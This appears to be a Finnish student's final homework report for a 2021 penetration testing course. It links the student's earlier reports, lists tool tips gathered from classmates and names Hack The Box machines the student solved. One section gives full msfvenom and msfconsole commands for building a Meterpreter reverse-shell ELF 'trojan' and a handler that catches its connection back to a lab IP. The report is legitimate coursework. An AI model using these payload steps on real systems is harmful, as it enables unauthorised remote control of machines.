# h7 Final Countdown

## a) Palauta kaikki. Laita tähän a-kohtaan linkki jokaiseen kotitehtäväraporttiisi.

- [h1: Vuohi, tappoketju ja pimeän verkon päiväkirjat](https://github.com/JesseKar/Pentest-2021-Autumn/blob/main/h1.md)
- [h2: turbo boosted](https://github.com/JesseKar/Pentest-2021-Autumn/blob/main/h2.md)
- [h3: Attaaack!](https://github.com/JesseKar/Pentest-2021-Autumn/blob/main/h3.md)
- [h4: Tiedustelua](https://github.com/JesseKar/Pentest-2021-Autumn/blob/main/h4.md)
- [h5: Me in the Middle](https://github.com/JesseKar/Pentest-2021-Autumn/blob/main/h5.md)
- [h6: hunter2](https://github.com/JesseKar/Pentest-2021-Autumn/blob/main/h6.md)


## b) Googlen kärkeen - Vapaaehtoinen, mutta helppo ja suositeltava: lisää linkki tehtäviisi tämän sivun perään kommentiksi.
- Linkki palautusrepositorioon lisätty [kurssisivulle](https://terokarvinen.com/2021/penetration-testing-course-2021-autumn/#h7-final-countdown) kommentteihin


## d) Joukkoäly - silmäile muiden kotitehtäväraportit, kerää lista parhaita komentoja ja havaintoja. 
- [Toni](https://tonikerttula.wordpress.com/2021/11/15/penetraatiotestaus-h3/) oli eräässä kotitehtävässä käyttänyt msfconsolen automaattisia ssh-login työkaluja ja niiden käyttöä on myös ohjeistettu kivasti!
    - Toni oli käyttänyt Owaspin Juice Shoppia yhtenä kohteena, mikä vaikuttaa mielenkiintoiselta harjoitusmaalilta
- [Atrolla](https://atrolindell.wordpress.com/2021/11/29/h5-me-in-the-middle/) oli hyvin poimittu esimerkkejä SQL-injektioista ja linkitetty mielestäni oiva SQL cheat sheetti lähteisiinsä, se löytyy suoraan [täältä](https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/)
- [Sami](https://kulonpaa.com/?cat=6) oli löytänyt SecListin sanakirjat, joihin olin itsekin törmännyt, ja siellä riittää listoja valtavasti. Lisäksi hyödyntänyt dirbusterin sanalistoja.
- [Rikulla](https://github.com/rikurikurikuriku/PenTestCourse/wiki/H6-Hunter2) oli mielestäni hyvin läpi hashcatilla rulesien käyttöä, tätä en itse ollut hirveästi vielä tehnyt, joten täältä sai kivasti vinkkejä sen käyttöön
    - [Rikulla](https://github.com/rikurikurikuriku/PenTestCourse/wiki/H6-Hunter2) näkyy myös hyvin oman sivun formiin tehdyn sanalistahyökkäyksen logia, eli ei kovin hiljaista touhua seurata mitä sivulla tapahtuu kun se on tällaisen hyökkäyksen alla.
- [Juuso](https://juusokalliomaki.com/blog/Pen-testing-4/#e) on hyvin yhdistänyt nikton, ffuffin ja eyewitnessin käyttöä, ensin hakemistot selville ffuffilla ja niktolla, niistä listat, joka annetaan eyewitnessille ajettavaksi.
    - [Juuso](https://juusokalliomaki.com/blog/Pen-testing-6/#f) oli käyttänyt myös johnin pdf murtotyökalua, jonka käyttö oli mielenkiintoista nähdä

## e) Rottia. Tee troijan hevonen
- Kalin levittyä, jouduin kaivamaan tähän nyt tunnilla tehdyn elfin
- msfconsole
1. `sudo msfconsole`
2. `exploit/multi/handler` ja y
3. `set LHOST 192.168.56.101` ja portti `set LPORT 1234` settarit
4. `set payload linux/x64/meterpreter_reverse_tcp` ja payloadi
5. `run` ja ajoa

- & msfvenom
6. `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.56.101 LPORT=1234 -f elf -o boom` luodaan roijalainen
7. `chmod u+x boom` oikeudet ajoon
8. `./boom` ja ajoa
9. -> meterpreter auki

### g) Vapaaehtoinen bonus, haastava: Lipunryöstö. Jos olet onnistunut korkkaamaan HTB:n koneita tai muita lipunryöstöjä, luettele onnistumiset. Liitä mukaan ruutukaappaus esim. HTB:n sivusta, jossa lippusi on lueteltu. Kannattaa laittaa myös linkki mahdolliseen HTB:n julkiprofiiliin. Myös puolikkaat huomioidaan, eli mainitse eroteltuna myös ne koneet, joista sinulla on vasta user flag (vaikka root falgia ei vielä olisikaan). Erottele selkeästi aktiiviset koneet eläköityineistä (retired).
- Horizontall on aktiivinen kone
- Secret on aktiivinen kone
- Bounty Hunter on eläköitynyt ja sen jatkaminen jäi ikävästi kesken
![htbpwns](/images/htbowns.png)

## Lähteet
- [Tero Karvinen, Kurssisivu](https://terokarvinen.com/2021/penetration-testing-course-2021-autumn/#h7-final-countdown)
- [Toni Kerttula](https://tonikerttula.wordpress.com/2021/11/15/penetraatiotestaus-h3/)
- [Atro Lindell](https://atrolindell.wordpress.com/2021/11/29/h5-me-in-the-middle/)
- [Kulonpaa](https://kulonpaa.com/?cat=6)
- [rikurikuriku](https://github.com/rikurikurikuriku/PenTestCourse/wiki/H6-Hunter2)
- [Juuso Kalliomäki](https://juusokalliomaki.com/blog/Pen-testing-4/#e)